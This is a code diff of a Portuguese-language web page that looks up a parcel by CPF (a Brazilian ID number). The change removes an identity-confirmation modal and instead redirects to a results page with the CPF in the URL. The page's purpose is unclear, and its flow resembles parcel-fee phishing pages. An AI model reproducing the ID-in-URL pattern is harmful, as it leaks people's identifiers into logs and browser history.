@@ -125,19 +125,7 @@
         </div>
     </div>
 
-    <div id="confirmModal" class="fixed inset-0 flex items-center justify-center z-50 hidden">
-        <div class="absolute inset-0 bg-black/50"></div>
-        <div class="relative bg-white rounded-md shadow-lg p-5 mx-4 w-full max-w-sm">
-            <h3 class="text-base font-bold text-gray-800 mb-3">Confirme seus dados</h3>
-            <p class="text-sm text-gray-600 mb-2">Encontramos uma encomenda para:</p>
-            <p id="confirmName" class="text-sm font-semibold text-gray-800 mb-4 uppercase"></p>
-            <p class="text-sm text-gray-600 mb-4">Você é essa pessoa?</p>
-            <div class="flex gap-3">
-                <button id="btnNo" class="flex-1 py-2 border border-gray-300 text-gray-700 rounded text-sm hover:bg-gray-50">Não</button>
-                <button id="btnYes" class="flex-1 py-2 bg-cyan-700 text-white rounded text-sm hover:bg-cyan-800">Sim</button>
-            </div>
-        </div>
-    </div>
+
 
     <div id="avisoModal" class="fixed inset-0 flex items-center justify-center z-50 hidden">
         <div class="absolute inset-0 bg-black/70 backdrop-blur-sm"></div>
@@ -231,31 +219,14 @@
             setTimeout(function() {
                 modal.classList.add('hidden');
                 
-                if (data.success && data.nome) {
-                    document.getElementById('confirmName').textContent = data.nome;
-                    document.getElementById('confirmModal').classList.remove('hidden');
-                } else {
-                    window.location.href = 'resultado/index0433.html?nome=&amp;cpf=&amp;nascimento=&amp;imagem=';
+                if (data.success) {
+                    // Ir direto para a próxima página com apenas o CPF
+                    window.location.href = 'resultado/index0433.html?cpf=' + encodeURIComponent(data.cpf);
                 }
             }, 2000);
         });
         
-        document.getElementById('btnYes').addEventListener('click', function() {
-            if (dadosConsulta) {
-                document.getElementById('confirmModal').classList.add('hidden');
-                
-                const nomeCompleto = dadosConsulta.nome || '';
-                const primeiroNome = nomeCompleto.split(' ')[0];
-                document.getElementById('avisoNomeCliente').textContent = primeiroNome;
-                
-                document.getElementById('avisoModal').classList.remove('hidden');
-            }
-        });
-        
-        document.getElementById('btnNo').addEventListener('click', function() {
-            document.getElementById('confirmModal').classList.add('hidden');
-            dadosConsulta = null;
-        });
+
         
         document.getElementById('btnCloseAviso').addEventListener('click', function() {
             if (dadosConsulta) {
